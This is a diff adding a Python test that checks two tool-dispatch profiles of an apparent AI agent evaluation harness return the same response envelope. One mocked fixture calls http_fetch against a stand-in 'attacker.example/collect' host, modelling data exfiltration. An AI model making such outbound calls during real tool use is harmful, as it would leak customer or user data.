@@ -169,6 +169,40 @@ def test_direct_dispatcher_matches_backends_for_the_same_filter(tmp_path):
         assert direct_result["rows"] == backend_result.rows
 
 
+def test_both_profiles_hand_the_model_the_same_response_envelope(tmp_path):
+    """The tool result is appended to the conversation verbatim.
+
+    So if the two profiles' envelopes differed by even one key, a live A/B
+    would be feeding the model different text and the comparison would not be
+    controlled. The broker always answers {"content", "rows"} (broker/app.py);
+    DirectDispatcher must too, for every tool.
+    """
+    db_path = tmp_path / "customers.db"
+    seed_customers(db_path, count=5)
+
+    def handler(request):
+        return httpx.Response(200, text="body")
+
+    kwargs = dict(
+        docstore_url="http://docstore.internal",
+        db_path=db_path,
+        mailer_url="http://mailer.internal",
+        client=httpx.Client(transport=httpx.MockTransport(handler)),
+    )
+    direct, backends = DirectDispatcher(**kwargs), Backends(**kwargs)
+
+    calls = {
+        "read_document": {"doc_id": "ticket-4711"},
+        "http_fetch": {"url": "http://attacker.example/collect", "body": "x"},
+        "send_email": {"to": ["customer:1"], "subject": "s", "body": "b"},
+        "query_customers": {"filter": "id=1"},
+    }
+    for tool, args in calls.items():
+        result = backends.execute(tool, args)
+        brokered = {"content": result.content, "rows": result.rows}
+        assert direct.call(tool, args).keys() == brokered.keys(), tool
+
+
 # --- The --live path -------------------------------------------------------
 #
 # LiveClient.next_step never passed `tools=`, so the model was never told any
